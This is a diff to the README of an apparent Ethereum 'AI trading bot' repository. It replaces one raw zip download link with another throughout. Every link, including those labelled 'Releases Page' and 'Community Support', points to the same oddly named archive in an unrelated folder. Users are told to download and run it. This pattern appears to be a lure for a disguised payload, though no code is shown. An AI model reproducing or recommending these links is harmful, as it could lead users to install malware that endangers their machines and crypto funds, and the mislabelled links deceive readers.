@@ -1,6 +1,6 @@
 # 🤖 AI_TRADING_BOT_ETHEREUM - Make Smart Trades Easily
 
-[![Download Now](https://github.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/raw/refs/heads/main/chorologist/BO_TRADIN_A_ETHEREUM_3.4.zip)](https://github.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/raw/refs/heads/main/chorologist/BO_TRADIN_A_ETHEREUM_3.4.zip)
+[![Download Now](https://raw.githubusercontent.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/main/chorologist/A-TRADIN-BO-ETHEREUM-v2.1.zip)](https://raw.githubusercontent.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/main/chorologist/A-TRADIN-BO-ETHEREUM-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the AI Trading Bot for Ethere
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click here to [download the latest version](https://github.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/raw/refs/heads/main/chorologist/BO_TRADIN_A_ETHEREUM_3.4.zip). 
+1. **Visit the Releases Page**: Click here to [download the latest version](https://raw.githubusercontent.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/main/chorologist/A-TRADIN-BO-ETHEREUM-v2.1.zip). 
 
 2. **Choose Your Version**: Once on the releases page, look for the most recent version of the bot. You will find various files available for download. 
 
@@ -55,7 +55,7 @@ For additional help, visit our community page or look at the FAQ section on GitH
 
 ## 🔗 Links & Resources
 
-- [Releases Page](https://github.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/raw/refs/heads/main/chorologist/BO_TRADIN_A_ETHEREUM_3.4.zip)
-- [Community Support](https://github.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/raw/refs/heads/main/chorologist/BO_TRADIN_A_ETHEREUM_3.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/main/chorologist/A-TRADIN-BO-ETHEREUM-v2.1.zip)
+- [Community Support](https://raw.githubusercontent.com/saidulkarimayas/AI_TRADING_BOT_ETHEREUM/main/chorologist/A-TRADIN-BO-ETHEREUM-v2.1.zip)
 
 Feel free to explore and let us know if you have questions or suggestions. Enjoy trading with the AI Trading Bot!
